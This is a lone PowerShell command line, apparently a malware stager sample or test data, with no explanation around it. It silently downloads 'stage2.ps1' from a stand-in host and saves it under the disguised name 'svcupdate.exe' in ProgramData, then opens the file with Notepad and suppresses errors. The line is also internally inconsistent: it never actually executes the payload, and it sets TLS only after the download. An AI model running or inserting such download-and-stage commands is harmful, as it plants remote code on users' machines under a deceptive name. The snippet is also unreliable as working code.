
curl.exe -s -L -o 'C:\ProgramData\svcupdate.exe' "http://contoso.com/stage2.ps1"; Start-Process -FilePath "notepad.exe" -ArgumentList 'C:\ProgramData\svcupdate.exe' -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
